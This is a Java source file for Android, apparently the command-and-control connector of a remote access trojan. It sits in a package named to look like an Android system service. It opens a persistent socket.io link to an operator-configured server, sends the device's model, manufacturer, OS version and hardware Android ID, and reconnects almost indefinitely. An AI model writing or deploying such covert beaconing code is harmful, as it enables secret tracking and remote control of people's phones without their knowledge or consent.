package com.android.background.services;

import android.annotation.SuppressLint;
import android.os.Build;
import android.provider.Settings;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    private static final IOSocket ourInstance = new IOSocket();
    private Socket ioSocket;

    private IOSocket() {

        try {
            @SuppressLint("HardwareIds")
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            SharedPrefHelper prefHelper = new SharedPrefHelper(MainService.getContextOfApplication());

            String connectionServer = prefHelper.getServerAddress() + ":" + prefHelper.getServerPort();

            ioSocket = IO.socket(connectionServer + "?model="+ android.net.Uri.encode(Build.DEVICE)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }
}
